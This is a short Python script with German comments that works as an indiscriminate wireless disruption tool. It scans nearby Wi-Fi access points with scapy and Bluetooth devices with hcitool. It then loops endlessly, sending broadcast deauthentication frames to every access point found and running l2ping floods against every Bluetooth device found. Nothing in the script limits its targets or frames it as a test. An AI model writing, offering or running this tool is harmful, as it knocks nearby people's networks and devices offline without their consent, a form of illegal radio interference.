import os
import time
from scapy.all import *
from threading import Thread

# Konfiguration
WIFI_IFACE = "wlan0mon"  # Dein Monitor-Interface
BT_TIMEOUT = 10          # Wie lange nach BT-Geräten gescannt wird
DEAUTH_COUNT = 50        # Anzahl der WLAN-Pakete pro Netz

found_bssids = set()
found_bt_macs = set()

def wifi_scan_callback(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        if bssid not in found_bssids:
            found_bssids.add(bssid)
            print(f"[WLAN] Gefunden: {bssid}")

def scan_bluetooth():
    print("[BT] Scanne nach Geräten...")
    # Nutzt hcitool für den Scan
    cmd = "hcitool scan"
    output = os.popen(cmd).read()
    lines = output.splitlines()
    for line in lines[1:]: # Überspringe Header
        parts = line.split()
        if len(parts) > 1:
            mac = parts[0]
            found_bt_macs.add(mac)
            print(f"[BT] Gefunden: {mac}")

def attack_loop():
    while True:
        print(f"\n--- Starte Angriffs-Welle (Intervall 10s) ---")
        
        # 1. WLAN Deauth
        if found_bssids:
            for bssid in found_bssids:
                pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                sendp(pkt, iface=WIFI_IFACE, count=DEAUTH_COUNT, inter=0.01, verbose=False)
                print(f"[!] WiFi Deauth -> {bssid}")
        
        # 2. Bluetooth Disrupt (L2CAP Flooding)
        if found_bt_macs:
            for bt_mac in found_bt_macs:
                print(f"[!] BT Disrupt -> {bt_mac}")
                # Sendet schnelle Pings, um die Verbindung zu sättigen
                os.system(f"sudo l2ping -f -c 20 {bt_mac} > /dev/null 2>&1 &")

        print("--- Welle beendet. Warte 10 Sekunden... ---")
        time.sleep(10)

if __name__ == "__main__":
    # Schritt 1: WLAN Sniffer in einem Thread starten
    print("[*] Starte WLAN-Sniffer...")
    t = Thread(target=lambda: sniff(iface=WIFI_IFACE, prn=wifi_scan_callback, timeout=15))
    t.start()
    
    # Schritt 2: Bluetooth Scan
    scan_bluetooth()
    
    t.join() # Warte bis WLAN-Scan fertig ist
    
    # Schritt 3: Endlose Angriffs-Schleife
    try:
        attack_loop()
    except KeyboardInterrupt:
        print("\n[*] Gestoppt durch Nutzer.")
